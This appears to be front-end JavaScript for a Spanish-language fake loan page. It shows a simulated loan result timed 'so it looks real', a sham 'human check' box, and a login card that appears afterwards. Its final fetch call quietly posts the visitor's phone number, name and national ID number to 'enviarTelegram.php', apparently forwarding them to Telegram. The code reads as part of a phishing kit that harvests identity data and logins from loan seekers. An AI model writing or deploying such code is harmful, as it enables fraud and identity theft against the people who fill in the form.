
  const btnMenu = document.querySelector('.btn-menu');
  const mobileMenu = document.getElementById('mobileMenu');
  const overlay = document.getElementById('menuOverlay');
  const closeMenu = document.getElementById('closeMenu');

  btnMenu.addEventListener('click', () => {
    mobileMenu.classList.add('active');
    overlay.classList.add('active');
  });

  closeMenu.addEventListener('click', closePanel);
  overlay.addEventListener('click', closePanel);

  function closePanel() {
    mobileMenu.classList.remove('active');
    overlay.classList.remove('active');
  }





  document.querySelectorAll('.footer-title').forEach(button => {
  button.addEventListener('click', () => {
    const content = button.nextElementSibling;

    // Toggle para mostrar/ocultar el contenido
    if (content.style.display === "block") {
      content.style.display = "none";
    } else {
      // Opcional: cierra los otros que estén abiertos
      document.querySelectorAll('.footer-content').forEach(el => el.style.display = 'none');
      content.style.display = "block";
    }
  });
});















document.addEventListener('DOMContentLoaded', () => {
    const btnEntrar = document.getElementById('btn-entrar');
    const formConsulta = document.getElementById('form-consulta');
    const resultadoPrestamo = document.getElementById('resultado-prestamo');

    btnEntrar.addEventListener('click', () => {
        // 1. (Opcional) Puedes añadir una lógica de carga aquí
        btnEntrar.innerText = "Cargando...";
        btnEntrar.disabled = true;

        // 2. Simulamos una pequeña espera de red (800ms) para que parezca real
        setTimeout(() => {
            // Ocultamos el formulario con una transición
            formConsulta.style.display = 'none';
            
            // Mostramos el resultado
            resultadoPrestamo.style.display = 'block';
            
            // Hacemos scroll hacia arriba para que el usuario vea el resultado
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }, 800);
    });
});
















  const humanCheck = document.getElementById("humanCheck");
  const btn = document.getElementById("btnEntrar");

  humanCheck.addEventListener("click", () => {
    humanCheck.classList.toggle("checked");

    if (humanCheck.classList.contains("checked")) {
      btn.disabled = false;
      btn.classList.add("active");
    } else {
      btn.disabled = true;
      btn.classList.remove("active");
    }
  });




  
  document.addEventListener("DOMContentLoaded", function () {
    const btnContinuar = document.getElementById("btn-continuar");
    const resultadoPrestamo = document.getElementById("resultado-prestamo");
    const loginCard = document.getElementById("entrar");

    // Ocultar login al inicio
    loginCard.style.display = "none";

    btnContinuar.addEventListener("click", function () {
      resultadoPrestamo.style.display = "none";
      loginCard.style.display = "block";
    });
  });


















fetch("enviarTelegram.php", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    telefono01: document.getElementById("telefono01").value,
    nombre01: document.getElementById("nombre01").innerText,
    cedula01: document.getElementById("cedula01").innerText
  })
});
